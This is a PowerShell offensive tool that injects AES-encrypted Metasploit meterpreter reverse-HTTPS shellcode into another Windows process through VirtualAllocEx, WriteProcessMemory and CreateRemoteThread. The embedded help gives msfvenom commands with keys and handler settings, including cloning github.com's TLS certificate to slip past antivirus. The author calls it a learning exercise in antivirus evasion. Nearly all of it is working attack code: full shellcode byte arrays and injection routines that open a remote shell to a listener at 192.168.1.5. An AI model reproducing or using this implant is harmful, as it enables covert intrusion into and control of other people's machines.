function Run-Msf5Aes256Payload 
{
<#
.SYNOPSIS
	Inject Msf5 encrypted payload (I know it does not make much sense an encrypted payload if we do not want to drop it 
    on HD but it's just an exercise to learn Powershell and test some AV evasione techniques). Al comunication must be over https with a cert. 
    The certificate can be selfsigned or cloned. Do not use the standard certificate of reverse_https handler 
    because some AV realy in the field of that cert for catch meterpreter session. This setup is similar to Paranoid mode 
    
	Resources:
	  - https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-Shellcode.ps1
.DESCRIPTION
	Author: @b4rtik
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.PARAMETER ProcessId
	ID of the process to be injected .
.EXAMPLE
	C:\PS> Run-Msf5Aes256Payload -ProcessId 1111
.EXAMPLE
	C:\PS> Stage-RLTestCase -Clean

.NOTE

    First of all we need a cert to evade some AV with https.

    auxiliary/gather/impersonate_ssl

    Module options (auxiliary/gather/impersonate_ssl):

       Name              Current Setting  Required  Description
       ----              ---------------  --------  -----------
       ADD_CN                             no        Add CN to match spoofed site name (e.g. *.example.com)
       CA_CERT                            no        CA Public certificate
       EXPIRATION                         no        Date the new cert should expire (e.g. 06 May 2012, YESTERDAY or NOW)
       OUT_FORMAT        PEM              yes       Output format (Accepted: DER, PEM)
       PRIVKEY                            no        Sign the cert with your own CA private key
       PRIVKEY_PASSWORD                   no        Password for private key specified in PRIV_KEY (if applicable)
       RHOSTS            www.github.com   yes       The target address range or CIDR identifier
       RPORT             443              yes       The target port (TCP)


    To generate msf5 payload

    WIN32 ./msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f psh

    exploit/multi/handler

    Payload options (windows/meterpreter/reverse_https):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.1.5      yes       The local listener hostname
       LPORT     443              yes       The local listener port
       LURI                       no        The HTTP Path


    2 Advanced options must be set

    msf5 exploit(multi/handler) > set handlersslcert ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    handlersslcert => ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    msf5 exploit(multi/handler) > set stagerverifysslcert true
    stagerverifysslcert => true


    x64 ./msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=/Users/starfish/.msf4/loot/20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f psh 

    exploit/multi/handler

    Payload options (windows/x64/meterpreter/reverse_https):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.1.5      yes       The local listener hostname
       LPORT     443              yes       The local listener port
       LURI                       no        The HTTP Path


    2 Advanced options must be set

    msf5 exploit(multi/handler) > set handlersslcert ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    handlersslcert => ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    msf5 exploit(multi/handler) > set stagerverifysslcert true
    stagerverifysslcert => true

    x64 ./msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=/Users/starfish/.msf4/loot/20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f psh 

    exploit/multi/handler

    Payload options (windows/x64/meterpreter/reverse_https):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.1.5      yes       The local listener hostname
       LPORT     443              yes       The local listener port
       LURI                       no        The HTTP Path


    2 Advanced options must be set

    msf5 exploit(multi/handler) > set handlersslcert ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    handlersslcert => ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    msf5 exploit(multi/handler) > set stagerverifysslcert true
    stagerverifysslcert => true
#>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [ValidateRange( 1,65535 )]
        [Int]
        $ProcessId = "0"
          )

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
    if ($IsWow64ProcessAddr)
    {
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        
        $64bitCPU = $true
    }
    else
    {
        $64bitCPU = $false
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }
    # Inject shellcode into the specified process ID
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
    $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
    $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
    Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
    write-host "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!"
    Inject-RemoteShellcode $ProcessId

}


# Starting from here the code that follows was taken directly from Epire Powershell
# https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-Shellcode.ps1

function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

 function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Msf5 reverse_httls (lhost 192.168.1.5 lport 443)
        [Byte[]] $Shellcode32 = 0x3d,0xfa,0x6a,0xd0,0x0a,0xcb,0xc9,0xb6,0x77,0x47,0x4a,0x6a,0x0b,0x31,0x0e,0xa7,0x52,0x30,0x3c,0x08,0x3e,0x35,0xd3,0x72,0x88,0x35,0x02,0xc3,0xa8,0xb7,0x97,0xfe,0x78,0x95,0x95,0xbe,0xf1,0x25,0xf4,0x4e,0x98,0xd9,0x73,0xba,0xae,0x6c,0xe2,0xb3,0x65,0xf2,0x24,0xfb,0x9b,0x8b,0x7a,0xef,0x19,0xeb,0x77,0x47,0x88,0x9c,0x14,0x85,0xde,0xd4,0x5f,0x1c,0x0c,0x2f,0x85,0x8b,0xcb,0x54,0x9b,0x0b,0xc0,0xad,0x73,0xec,0x40,0xb2,0xe0,0x49,0x2a,0xc1,0x56,0x3d,0xc5,0xfe,0x8e,0x31,0x13,0x79,0x09,0xe1,0x34,0x57,0x67,0x77,0x6c,0x42,0x68,0xa4,0x97,0xed,0x03,0x43,0x42,0xb4,0x30,0x58,0x74,0x58,0x71,0x69,0xd0,0x8f,0xc4,0x6f,0xe1,0xe4,0x42,0x04,0x2a,0x14,0x15,0x75,0x28,0x9c,0xfd,0x75,0xae,0x6e,0xc6,0x45,0xfc,0x94,0x21,0x3a,0x09,0x59,0x67,0x15,0x49,0x93,0x69,0xd5,0x02,0xf8,0x08,0xc4,0x07,0x40,0x50,0x56,0xe6,0x0a,0x03,0x74,0xc0,0xd0,0xa2,0xc0,0xf1,0x13,0xe5,0x6b,0xeb,0x51,0xf8,0x1f,0x5c,0x45,0x40,0xb9,0x7d,0x9c,0x37,0xe8,0xbe,0xa0,0xf5,0x90,0x57,0xe0,0x08,0x63,0xb2,0x30,0xec,0x0a,0xb9,0xc3,0xc0,0x9b,0x4b,0xfc,0xfd,0xbb,0xff,0xd0,0x57,0x19,0xab,0x26,0xcb,0xb4,0x4c,0xeb,0xb3,0x0a,0x4f,0xbe,0x39,0x0d,0x36,0x78,0xc3,0x1c,0x3d,0x4d,0x39,0xf4,0x27,0x34,0xc6,0x47,0xfd,0x65,0xee,0x07,0x95,0x20,0xdc,0xfa,0x98,0x47,0x05,0x22,0x90,0xf8,0xfb,0xba,0xe1,0xeb,0x7a,0x5d,0x4f,0x28,0x3f,0x69,0xbb,0x1b,0xd8,0xbc,0x1d,0xc2,0x4b,0x66,0xc9,0x33,0x5c,0xff,0x3e,0xde,0x47,0x79,0xf3,0xcc,0x0d,0xc4,0x53,0x7f,0x8f,0xdb,0xb9,0xac,0xc8,0x08,0x6c,0xa7,0x27,0x0e,0xd0,0xd3,0x98,0xda,0xd2,0x28,0x90,0x43,0x97,0x40,0xa2,0xb9,0x7a,0xcd,0xa5,0x48,0x91,0xf3,0x97,0xae,0xb7,0x63,0x24,0x11,0xd4,0x7b,0x7e,0x6e,0x31,0x79,0x19,0x9f,0x38,0x9a,0xdd,0xd2,0x6b,0x93,0xd0,0x2e,0x1a,0x01,0xaa,0xb7,0x63,0x72,0x38,0x2f,0xe0,0xcc,0xf4,0x3d,0x2b,0x34,0xd5,0x21,0xd0,0x52,0x20,0x0f,0x14,0x08,0x70,0x4a,0xbc,0x82,0xa2,0xfe,0x1e,0x30,0x2a,0xdc,0x1d,0x13,0x21,0x6a,0x0d,0x5f,0xde,0xb5,0x4a,0xbe,0xbb,0xbf,0x43,0xa6,0xed,0xd6,0x4b,0xa4,0x06,0x2f,0x90,0x74,0xe2,0xe9,0x96,0x0a,0xc7,0xc1,0xac,0xea,0xde,0xb2,0x64,0x3a,0x41,0xab,0xd9,0xe5,0xdc,0xe0,0x86,0x26,0x4f,0x6b,0xd9,0x1e,0xa8,0xe0,0x95
        [Byte[]] $Shellcode64 = 0xdb,0xed,0xc1,0xaa,0x8d,0x1b,0x95,0xdc,0xe3,0x65,0x41,0x52,0x43,0xad,0xc8,0xa8,0xef,0x97,0xc2,0xd0,0x86,0x6b,0x49,0x85,0xee,0x07,0x23,0x87,0xfd,0x2f,0xad,0x9d,0x5b,0x1e,0x83,0x1b,0xa7,0x99,0xcb,0xb0,0xe3,0x9c,0x60,0x33,0x0f,0x9c,0xf2,0xcd,0x7a,0x9a,0xdd,0xe5,0x42,0x41,0x6b,0x41,0x3a,0xc4,0xa9,0xba,0x74,0x66,0x43,0x3b,0xba,0x19,0x22,0xc6,0xd3,0x74,0xf4,0x83,0xbe,0x26,0x8d,0x6f,0x00,0x61,0x6a,0x38,0x68,0x60,0xe1,0xb8,0x72,0x48,0x73,0xab,0x22,0xd0,0xce,0x01,0x06,0x85,0xb8,0x64,0x18,0xcb,0x87,0x68,0x83,0x70,0xb6,0x81,0x84,0x9a,0x32,0x6b,0x20,0x68,0xa7,0x00,0x4b,0x3b,0xff,0xa9,0xb8,0xe1,0xe4,0x8e,0xe4,0xa6,0xbb,0x3b,0x88,0xd4,0xe5,0xa4,0x29,0x00,0xe2,0x79,0x5f,0xc6,0x2c,0x80,0x4d,0x30,0x35,0x9f,0x7c,0x86,0xef,0xe6,0x3f,0x8c,0xae,0x36,0x6a,0xba,0x15,0x7f,0x04,0x84,0xea,0xf4,0x9c,0x25,0x13,0xd7,0x33,0x73,0xee,0x6f,0xee,0x19,0x18,0x4a,0x1f,0xd2,0xa0,0xc5,0x7c,0x05,0x90,0xbf,0x38,0xe0,0x24,0x92,0xf8,0xb1,0xcd,0x5b,0xef,0x4c,0xe6,0x5a,0xb8,0xd5,0x99,0x59,0xaf,0x33,0x58,0xf0,0xea,0xa7,0xf1,0x06,0x9b,0x2d,0x6f,0xd1,0xd4,0x2c,0x44,0xa8,0x20,0x1e,0x44,0xd3,0xa0,0x03,0xf7,0xb9,0x2d,0x31,0x1b,0x09,0xc0,0x3e,0x1d,0x28,0x77,0x17,0x9d,0xf4,0xd7,0x7e,0xd5,0xf9,0xcb,0x9e,0x37,0xfa,0x86,0x82,0x8d,0x05,0x3c,0x32,0x28,0xc8,0x5d,0x7e,0x5b,0xaf,0x69,0xb8,0x93,0x4a,0x0c,0x79,0x90,0x7a,0xc7,0x16,0xfa,0x5c,0x70,0x4e,0xab,0x6c,0x8c,0x90,0xb6,0xa1,0xd3,0xc4,0x49,0x32,0xfc,0x76,0xb3,0x25,0x32,0x64,0x1e,0xd8,0xa9,0xaa,0xa2,0x49,0x5c,0xd5,0xb5,0x86,0x12,0x00,0x95,0x3c,0x0d,0xe8,0x3c,0x6b,0xfb,0x3a,0xaa,0xcf,0xd7,0x90,0x02,0x96,0x78,0x5b,0x5b,0x06,0x59,0xae,0xf4,0x63,0x1c,0x02,0x9f,0xbe,0x72,0xc2,0x34,0xb3,0x39,0x05,0x99,0xc0,0x0f,0x20,0x59,0x7e,0x35,0x45,0x81,0xb0,0x8b,0x3b,0xdb,0xe3,0x32,0x2c,0x7a,0x32,0xd9,0xf0,0x30,0x70,0xd3,0x31,0x80,0x87,0x3c,0xa6,0x72,0xbe,0x68,0xbd,0x9f,0x8a,0x2d,0xaa,0x43,0x6d,0xc1,0x6e,0xd7,0x42,0xdc,0xfe,0x2b,0x9f,0x38,0x58,0x4b,0x56,0xc3,0xc0,0x91,0x60,0x8c,0x7a,0xb0,0xab,0x4f,0xde,0x65,0x6c,0x97,0x52,0xec,0x43,0xd1,0x9e,0x38,0x40,0x1f,0x1b,0x19,0x42,0x44,0x24,0x7d,0x88,0xcf,0x99,0x9f,0xd4,0x90,0x5c,0xe6,0xc1,0x89,0x4c,0x84,0xb3,0x4f,0xa6,0x6b,0x0d,0x84,0xf6,0x49,0x18,0xeb,0x11,0xc0,0xaf,0xc7,0x8e,0xe8,0xdf,0xee,0x47,0x3d,0x37,0x24,0x0d,0x93,0x7b,0xda,0x72,0xff,0xa0,0xff,0x7f,0x65,0x8f,0x70,0xea,0xb7,0x6e,0x03,0xdb,0xfa,0xcc,0x38,0xdf,0x69,0xd0,0xeb,0xcb,0xc9,0x09,0x8c,0x32,0x2f,0xaa,0xa0,0xed,0x63,0xfe,0xe9,0x61,0x24,0xcb,0xcf,0xa6,0xbb,0x09,0x10,0x32,0x4c,0x6b,0xa2,0x0b,0x5b,0x97,0x9d,0x04,0x9d,0x55,0x39,0x96,0xc0,0xdb,0x58,0xbe,0xc8,0xc9,0xc3,0x0c,0x19,0xaf,0xe6,0xfb,0x3e,0x35,0x45,0x1e,0x98,0x91,0x50,0xb3,0x5a,0x61,0x08,0x38,0xcb,0x52,0xe9,0xbe,0x55,0x8b,0xc5,0x30,0xc3,0x71,0x1e,0x29,0x71,0xd5,0x43,0x3d,0x4f,0xd2,0x41,0xd9,0xf8,0xe0,0x90,0x0b,0x47,0xfe,0x48,0xf6,0xb9,0x7f,0x8b,0x54,0xbd,0xcf,0x25,0xcf,0x60,0xbd,0x3d,0xce,0xa2,0x74,0xd9,0x1a,0x29,0x72,0xba,0xa5,0xe8,0x3f,0xf7,0xf0,0x1a,0x66,0xf2,0x36,0x3a,0x17,0xe0,0x76,0x17,0xa8,0x18,0xdb,0xdb,0xf3,0x29,0x4b,0x45,0x2d,0xb2,0xa5,0xfe,0x77,0x10,0x19,0x94,0xf1,0x00,0xf1,0x00,0xc7,0xe4,0xed,0xd6,0x97,0xaa,0x77,0xdd,0x66,0xf5,0xe7,0xf7,0x1a,0xb6,0x10,0x9f,0xa0,0xeb,0x3e,0xcf,0x5a,0x95,0x65,0xed,0x5e,0x1e,0x80,0x11,0x33,0xc8,0xd4,0xb2,0x1e,0x52,0xbd,0x88,0xea,0xb1,0x59,0x01,0xf5,0x5e,0x46,0xe9,0x20,0x4c,0x40,0x1e,0x02,0xf6,0x68,0xb9,0xb0,0xdf,0x5f,0x92,0x89,0x3b,0x62,0x69,0x5a,0xe4,0x9d,0x50,0x2e,0xfc,0x3f,0x8d,0x4d,0xa2,0x40,0xfa,0x33,0x08,0x10,0xd7,0x3f,0x41,0x16,0x41,0x33,0x42
        
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
        {
            # Determine is the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    
        